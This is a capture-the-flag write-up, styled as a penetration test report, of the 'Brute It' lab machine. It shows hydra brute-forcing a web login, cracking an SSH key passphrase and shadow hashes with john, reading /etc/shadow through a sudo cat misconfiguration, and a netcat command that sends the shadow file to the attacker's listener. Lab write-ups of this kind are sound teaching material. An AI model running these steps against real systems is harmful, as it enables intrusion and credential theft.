## Penetration Test Report
of Brute It
2022-09-24

Who-am-i
Contact info
### Table of contents:

Exective summary
Summary of results
Attack narrative
Conclusion
Recommendations

### executive summary

I was supposed to conduct a penetration test of Brute it machine. Specific goals were:
- identifying if remote attacker could penetrate Brute it 
- determining the impact of a security breach:
	- confidentiality of company's private data (`user.txt` and `root.txt` assets)
	- availability of Brute it information systems

### summary of results
Initial reconnaisannce resulted in discovery of web logging interface. Using page source informations - through dictionary attack I was able to gain access to RSA private key of John. Key was poorely protected with short passphrase.

Using sudo misconfiguration I was able to intercept password hashes of all users. With cracked root password I gained full control over Brute it.

### Attack narrative
#### Web interface compromise
`sudo nmap -sV -p 80 10.10.141.47`
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

`gobuster dir -u 10.10.13.234 -w /usr/share/wordlists/dirb/common.txt -o output_gobuster -q`
```
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.13.234/admin/]
/index.html           (Status: 200) [Size: 10918]                  
/server-status        (Status: 403) [Size: 277]
```

`sudo hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.220.119 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:invalid`
```
[80][http-post-form] host: 10.10.220.119   login: admin   password: xavier
```

On web-page there is an RSA private key of user John

#### id_rsa crack
`/usr/lib/john/ssh2john.py id_rsa_john > rsa_johnable`
(script had to be modified - `decodestring()` no longer exists from python3.9, substitute with `base64.b64decode()`)

`john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt --format=SSH rsa_johnable`
```
status
rockinroll       (id_rsa_priv)
```
Thats id_rsa passphrase. With it I can ssh into John account

#### john account compromise
`chmod 600 id_rsa_john`

`ssh john@10.10.36.191 -i id_rsa_bruteit`
```
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
```
John's accout is compromised. `user.txt` asset intercepted

#### privilege escalation
`id`
```
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
```
john is in sudo group

`sudo -l`
i.a.
```
User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
john can run `cat` with sudo

`sudo cat /etc/shadow > ~/john`
this file contain hashes of all users accounts

listener (attacker):
`nc -lvp port > john_shadow`
sender(target):
`nc -vn listener_ip port < john`

`john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt john_shadow`
```
status
football         (root)
```
root password

`su root` -> root account compromised
`cat /root/root.txt` -> root asset intercepted

### Conclusion
Brute it suffered a series of control failures, which led to a complete compromise of Brute it system.

Specific goals were stated as:
- identifying if remote attacker could penetrate Brute it 
- determining the impact of a security breach:
	- confidentiality of company's private data (`user.txt` and `root.txt` assets)
	- availability of Brute it information systems
These goals of penetration test were met.

### Recommendations
1. Ensure strong passwords - generic explanation
2. Ensure bruteforce protection of web logons
3. Conduct regular vulnerability assasments
